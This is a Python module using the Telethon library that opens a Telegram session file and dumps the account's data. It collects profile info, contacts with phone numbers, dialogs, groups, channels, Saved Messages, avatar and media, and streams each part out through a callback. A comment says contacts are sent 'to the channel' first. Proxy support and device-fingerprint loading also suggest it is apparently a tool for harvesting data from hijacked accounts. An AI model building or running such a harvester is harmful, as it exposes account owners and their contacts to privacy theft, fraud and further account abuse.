from __future__ import annotations

import csv
import os
from dataclasses import dataclass
from datetime import datetime
from typing import Any, Awaitable, Callable, Mapping, Optional

from telethon import TelegramClient, functions
from telethon.tl.types import Channel, Chat, User

from app.credentials import TelegramCredentials
from app.device_fingerprint import load_device_params, sanitize_device_params
from web.services.account_card import AccountStats, preview_contact_line
from web.services.export_options import ExportOptions
from web.services.flood import call_with_flood_wait
from web.services.proxy import ProxySettings

PartCallback = Callable[[str, Optional[str], dict[str, Any]], Awaitable[None]]


@dataclass
class ExportResult:
	folder: str
	stats: AccountStats
	me: Any
	avatar_path: Optional[str] = None


class ClientFactory:
	@staticmethod
	def create(
		session_path: str,
		proxy: Optional[ProxySettings] = None,
		device: Optional[Mapping[str, Any]] = None,
	) -> TelegramClient:
		base = session_path[:-8] if session_path.endswith(".session") else session_path
		resolved_device = sanitize_device_params(device) or load_device_params(base)
		kwargs = TelegramCredentials.client_kwargs(resolved_device or None)
		resolved = proxy if proxy is not None else ProxySettings.from_env()
		if resolved:
			kwargs["proxy"] = resolved.to_telethon()
		kwargs.setdefault("connection_retries", 3)
		kwargs.setdefault("timeout", 15)
		kwargs.setdefault("retry_delay", 1)
		return TelegramClient(base, **kwargs)


class AccountExporter:
	"""Выгрузка: контакты → чаты/каналы → сводка; плюс медиа."""

	DUMPS_DIR = "dumps"
	PEOPLE_FILE = "people.txt"

	def __init__(self, options: Optional[ExportOptions] = None) -> None:
		self.options = options or ExportOptions()

	async def export_from_session(
		self,
		session_path: str,
		proxy: Optional[ProxySettings] = None,
		on_part: Optional[PartCallback] = None,
	) -> ExportResult:
		client = ClientFactory.create(session_path, proxy=proxy)
		await client.connect()
		try:
			if not await client.is_user_authorized():
				raise RuntimeError("Сессия не авторизована")
			return await self.export_from_client(client, on_part=on_part)
		finally:
			await client.disconnect()

	async def export_from_client(
		self,
		client: TelegramClient,
		on_part: Optional[PartCallback] = None,
	) -> ExportResult:
		me = await client.get_me()
		stamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
		phone = me.phone or str(me.id)
		folder = os.path.join(self.DUMPS_DIR, f"{phone}_{stamp}")
		os.makedirs(folder, exist_ok=True)
		stats = AccountStats()

		await self._write_info(me, folder)
		stats.has_info = True
		await self._emit(on_part, "info", os.path.join(folder, "info.txt"), {"me": me})

		# контакты сразу — чтобы уходили в канал до долгого обхода диалогов
		contact_blocks, contact_csv, preview = await self._dump_contacts(client, folder)
		stats.contacts = len(contact_blocks)
		stats.has_contacts_file = True
		stats.preview_contacts = preview
		await self._emit(
			on_part,
			"contacts",
			os.path.join(folder, "contacts.txt"),
			{"count": stats.contacts, "preview": preview},
		)

		avatar_path = None
		if self.options.dump_avatar:
			avatar_path = await self._download_avatar(client, folder)
			stats.has_avatar = bool(avatar_path)
			if avatar_path:
				await self._emit(on_part, "avatar", avatar_path, {})

		private_dialogs, dialog_blocks, group_blocks, channel_blocks, chat_csv = (
			await self._dump_dialogs(client, folder)
		)
		stats.dialogs = len(dialog_blocks)
		stats.groups = len(group_blocks)
		stats.channels = len(channel_blocks)
		stats.has_chats_file = True
		await self._emit(
			on_part,
			"chats",
			os.path.join(folder, "chats_channels.txt"),
			{"groups": stats.groups, "channels": stats.channels, "dialogs": stats.dialogs},
		)

		self._write_people_aggregate(
			folder,
			dialog_blocks,
			contact_blocks,
			group_blocks,
			channel_blocks,
			contact_csv + chat_csv,
		)
		await self._emit(on_part, "people", os.path.join(folder, self.PEOPLE_FILE), {})
		await self._emit(on_part, "csv", os.path.join(folder, "people.csv"), {})

		if self.options.dump_saved_messages:
			await self._write_saved_messages(client, folder)
			await self._emit(on_part, "saved", os.path.join(folder, "saved_messages.txt"), {})

		if self._need_media():
			await self._emit(on_part, "media_start", None, {})
			await self._download_media(client, folder, private_dialogs)
			await self._emit(on_part, "media_done", folder, {})

		return ExportResult(folder=folder, stats=stats, me=me, avatar_path=avatar_path)

	@staticmethod
	async def _emit(
		on_part: Optional[PartCallback],
		name: str,
		path: Optional[str],
		extra: dict[str, Any],
	) -> None:
		if on_part:
			await on_part(name, path, extra)

	def _need_media(self) -> bool:
		return self.options.dump_photo or self.options.dump_voice or self.options.dump_video

	async def _write_info(self, me, folder: str) -> None:
		path = os.path.join(folder, "info.txt")
		lines = [
			f"Date: {datetime.now().isoformat(timespec='seconds')}",
			f"ID: {me.id}",
			f"Username: @{me.username}" if me.username else "Username: -",
			f"Name: {me.first_name or ''} {me.last_name or ''}".strip(),
			f"Phone: +{me.phone}" if me.phone else "Phone: -",
			f"Premium: {getattr(me, 'premium', False)}",
		]
		with open(path, "w", encoding="utf-8") as file:
			file.write("\n".join(lines) + "\n")

	async def _dump_contacts(
		self, client: TelegramClient, folder: str
	) -> tuple[list[str], list[dict[str, str]], list[str]]:
		contacts_result = await call_with_flood_wait(
			lambda: client(functions.contacts.GetContactsRequest(hash=0))
		)
		blocks: list[str] = []
		csv_rows: list[dict[str, str]] = []
		preview: list[str] = []
		for user in contacts_result.users:
			if getattr(user, "bot", False):
				continue
			blocks.append(self._format_person(user, with_link=True))
			csv_rows.append(self._person_csv_row("contact", user))
			if len(preview) < 12:
				preview.append(preview_contact_line(user))

		path = os.path.join(folder, "contacts.txt")
		with open(path, "w", encoding="utf-8") as file:
			file.write(f"Контакты: {len(blocks)}\n\n")
			file.write("\n".join(blocks) if blocks else "-")
			file.write("\n")
		return blocks, csv_rows, preview

	async def _dump_dialogs(self, client: TelegramClient, folder: str):
		dialog_blocks = []
		group_blocks = []
		channel_blocks = []
		private_dialogs = []
		csv_rows: list[dict[str, str]] = []

		async for dialog in client.iter_dialogs():
			entity = dialog.entity

			if isinstance(entity, User):
				if getattr(entity, "bot", False) or getattr(entity, "is_self", False):
					continue
				dialog_blocks.append(self._format_person(entity, with_link=True))
				private_dialogs.append(dialog)
				csv_rows.append(self._person_csv_row("dialog", entity))
				continue

			title = dialog.name or "-"
			link = await self._resolve_link(client, entity)
			block = f"название: {title} | ссылка: {link}"

			if isinstance(entity, Chat):
				group_blocks.append(block)
				csv_rows.append(
					{
						"type": "group",
						"name": title,
						"link": link,
						"phone": "",
						"username": "",
						"id": str(getattr(entity, "id", "")),
					}
				)
			elif isinstance(entity, Channel):
				kind = "channel" if entity.broadcast else "group"
				if entity.broadcast:
					channel_blocks.append(block)
				else:
					group_blocks.append(block)
				csv_rows.append(
					{
						"type": kind,
						"name": title,
						"link": link,
						"phone": "",
						"username": getattr(entity, "username", "") or "",
						"id": str(getattr(entity, "id", "")),
					}
				)

		chats_path = os.path.join(folder, "chats_channels.txt")
		with open(chats_path, "w", encoding="utf-8") as file:
			file.write(f"Группы: {len(group_blocks)}\n\n")
			file.write("\n".join(group_blocks) if group_blocks else "-")
			file.write(f"\n\nКаналы: {len(channel_blocks)}\n\n")
			file.write("\n".join(channel_blocks) if channel_blocks else "-")
			file.write("\n")

		return private_dialogs, dialog_blocks, group_blocks, channel_blocks, csv_rows

	def _write_people_aggregate(
		self,
		folder: str,
		dialog_blocks: list[str],
		contact_blocks: list[str],
		group_blocks: list[str],
		channel_blocks: list[str],
		csv_rows: list[dict[str, str]],
	) -> None:
		parts = [
			"=== ДИАЛОГИ ===",
			f"Всего: {len(dialog_blocks)}",
			"",
			("\n".join(dialog_blocks) if dialog_blocks else "-"),
			"",
			"=== КОНТАКТЫ ===",
			f"Всего: {len(contact_blocks)}",
			"",
			("\n".join(contact_blocks) if contact_blocks else "-"),
			"",
			"=== ЧАТЫ / КАНАЛЫ ===",
			"",
			f"--- Группы: {len(group_blocks)} ---",
			("\n".join(group_blocks) if group_blocks else "-"),
			"",
			f"--- Каналы: {len(channel_blocks)} ---",
			("\n".join(channel_blocks) if channel_blocks else "-"),
			"",
		]
		with open(os.path.join(folder, self.PEOPLE_FILE), "w", encoding="utf-8") as file:
			file.write("\n".join(parts))

		with open(os.path.join(folder, "people.csv"), "w", encoding="utf-8-sig", newline="") as file:
			writer = csv.DictWriter(
				file,
				fieldnames=["type", "name", "link", "phone", "username", "id"],
			)
			writer.writeheader()
			writer.writerows(csv_rows)

	@staticmethod
	def _person_csv_row(kind: str, user) -> dict[str, str]:
		name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "-"
		username = user.username or ""
		link = f"https://t.me/{username}" if username else f"tg://user?id={user.id}"
		return {
			"type": kind,
			"name": name,
			"link": link,
			"phone": f"+{user.phone}" if user.phone else "",
			"username": f"@{username}" if username else "",
			"id": str(user.id),
		}

	@staticmethod
	def _format_person(user, with_link: bool = False) -> str:
		name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "-"
		username = f"@{user.username}" if user.username else "-"
		phone = f"+{user.phone}" if user.phone else "-"
		if user.username:
			link = f"https://t.me/{user.username}"
		else:
			link = f"tg://user?id={user.id}"
		parts = [
			f"имя: {name}",
			f"номер: {phone}",
			f"user: {username}",
			f"id: {user.id}",
		]
		if with_link:
			parts.append(f"ссылка: {link}")
		return " | ".join(parts)

	async def _write_saved_messages(self, client: TelegramClient, folder: str) -> None:
		path = os.path.join(folder, "saved_messages.txt")
		messages = []
		async for message in client.iter_messages("me"):
			if message.text:
				messages.append(message.text)
		with open(path, "w", encoding="utf-8") as file:
			file.write("\n\n".join(messages))

	async def _download_avatar(self, client: TelegramClient, folder: str) -> Optional[str]:
		try:
			path = await call_with_flood_wait(
				lambda: client.download_profile_photo("me", os.path.join(folder, "ava"))
			)
			if path and os.path.isfile(path):
				return path
			# Telethon может сохранить как ava.jpg рядом
			for name in os.listdir(folder):
				if name.startswith("ava"):
					return os.path.join(folder, name)
		except Exception:
			pass
		return None

	async def _download_media(self, client: TelegramClient, folder: str, private_dialogs: list) -> None:
		photos_dir = os.path.join(folder, "photos")
		voices_dir = os.path.join(folder, "voice_messages")
		videos_dir = os.path.join(folder, "videos")

		if self.options.dump_photo:
			os.makedirs(photos_dir, exist_ok=True)
		if self.options.dump_voice:
			os.makedirs(voices_dir, exist_ok=True)
		if self.options.dump_video:
			os.makedirs(videos_dir, exist_ok=True)

		max_bytes = int(self.options.max_video_mb * 1000 * 1000)
		stats = {"photos": 0, "voices": 0, "videos": 0}

		dialogs = private_dialogs
		if not self.options.only_private_chats_media:
			dialogs = [d async for d in client.iter_dialogs()]

		for dialog in dialogs:
			entity = dialog.entity
			if isinstance(entity, User) and getattr(entity, "bot", False):
				continue

			async for message in client.iter_messages(entity):
				try:
					if message.photo and self.options.dump_photo:
						await call_with_flood_wait(
							lambda m=message: m.download_media(photos_dir)
						)
						stats["photos"] += 1

					document = message.document
					if not document:
						continue

					mime = getattr(document, "mime_type", "") or ""
					size = getattr(document, "size", 0) or 0

					if mime == "audio/ogg" and self.options.dump_voice:
						await call_with_flood_wait(
							lambda m=message: m.download_media(voices_dir)
						)
						stats["voices"] += 1
					elif mime == "video/mp4" and self.options.dump_video and size <= max_bytes:
						await call_with_flood_wait(
							lambda m=message: m.download_media(videos_dir)
						)
						stats["videos"] += 1
				except Exception:
					continue

		with open(os.path.join(folder, "media_stats.txt"), "w", encoding="utf-8") as file:
			file.write(
				"\n".join(
					[
						f"photos: {stats['photos']}",
						f"voices: {stats['voices']}",
						f"videos: {stats['videos']}",
						f"max_video_mb: {self.options.max_video_mb}",
					]
				)
				+ "\n"
			)

	async def _resolve_link(self, client: TelegramClient, entity) -> str:
		username = getattr(entity, "username", None)
		if username:
			return f"https://t.me/{username}"

		if isinstance(entity, User):
			return f"tg://user?id={entity.id}"

		try:
			if isinstance(entity, Channel):
				result = await call_with_flood_wait(
					lambda: client(functions.messages.ExportChatInviteRequest(peer=entity))
				)
				link = getattr(result, "link", None)
				if link:
					return link
		except Exception:
			pass

		return f"id:{getattr(entity, 'id', '-')}"
